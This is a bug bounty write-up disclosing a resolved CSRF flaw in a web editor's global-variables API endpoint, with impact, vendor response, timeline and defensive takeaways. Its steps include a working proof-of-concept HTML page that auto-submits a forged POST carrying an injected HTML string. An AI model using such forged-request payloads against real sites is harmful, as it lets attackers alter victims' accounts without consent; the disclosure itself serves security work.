---
title: "CSRF — Missing Protection on Editor API Endpoint"
description: "A state-changing API endpoint in a web application editor had no CSRF protection at all, allowing attackers to silently inject data into victim accounts via a simple HTML form."
date: 2025-07-14
categories: [Writeups]
tags: [bugbounty, csrf, web, hackerone]
author: MOZA
toc: true
severity: "High"
platform: "HackerOne"
report: "https://hackerone.com/reports/3252899"
---

## Summary

| Detail | Value |
|--------|-------|
| **Target** | Web application editor (`/editor/*`) |
| **Weakness** | Cross-Site Request Forgery (CSRF) |
| **Severity** | High |
| **Status** | Resolved |
| **Platform** | HackerOne |
| **Reported** | 2025-07-14 |
| **Resolved** | 2025-09-10 |

## Overview

A state-changing API endpoint under the application's editor interface had **no CSRF protection at all**. This allowed an attacker to craft a simple HTML page that, when visited by a logged-in user, would silently create or modify data in the victim's account without any interaction.

## The Vulnerability

The endpoint:

```
POST /editor/api/global-variables
```

accepted state-changing requests (creating global variables) with **no CSRF verification**. Since HTML form submissions bypass CORS preflight checks, an attacker could submit a cross-origin POST request as the victim simply by having them visit a malicious page.

## Steps to Reproduce

1. Victim must be logged into the application (with a valid session)
2. Attacker hosts the following HTML on any domain:

```html
<!DOCTYPE html>
<html>
  <body>
    <form action="https://example.com/editor/api/global-variables" method="POST" enctype="application/x-www-form-urlencoded">
      <input type="hidden" name="name" value='"><h1>moza pwned this</h1>'>
      <input type="hidden" name="value_type" value="link">
      <input type="hidden" name="value" value="https://evil.com">
      <input type="hidden" name="is_shared_with_account" value="false">
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

3. Victim visits the attacker-controlled page
4. Without any user interaction, a new global variable is silently created in their account

## Result

A new global variable appears in the victim's account within the editor interface. The variable includes attacker-controlled content such as:

```
<h1>moza pwned this</h1>
```

The attacker can **inject persistent data** into the user's account without their knowledge or consent.

## Impact

- **Silent injection** of malicious variables into victim accounts
- **Automation hijack** — global variables directly influence user workflows and automations
- **Logic corruption** — misrouting or leakage of data via manipulated variables
- **Stored XSS risk** — if attacker-controlled variable values are rendered unsanitized
- Works with **no user interaction** beyond visiting a page while logged in
- Affects **any logged-in user** visiting a malicious page

## Vendor Response

The security team confirmed:

> *"Good find! The problem here is that there's no CSRF protection at all on this endpoint. Thank you for making the platform more secure!"*

The severity was initially set to Medium, then **upgraded to High** after discussion, with an additional bounty awarded:

> *"There is a good case to be made here for raising the severity to High. Also, because this report made us take a better look at our internal CSRF protections, we can raise the severity as a token of appreciation for that."*

## Timeline

| Date | Event |
|------|-------|
| 2025-07-14 | Report submitted |
| 2025-07-15 | Preliminary analyst review passed |
| 2025-07-21 | Report validated, sent to remediation team |
| 2025-08-12 | Bug triaged by security team |
| 2025-08-14 | Bounty awarded |
| 2025-09-10 | Severity upgraded to High, additional bounty awarded |
| 2025-09-10 | Bug resolved |

## Takeaways

1. **Every state-changing endpoint needs CSRF protection** — even internal API routes used by the editor
2. **HTML form submissions bypass CORS preflight** — even if JavaScript-based cross-origin requests are blocked, forms can still exploit missing CSRF protection
3. **CSRF tokens must be validated server-side** — tokens should be generated server-side and verified against the user's session
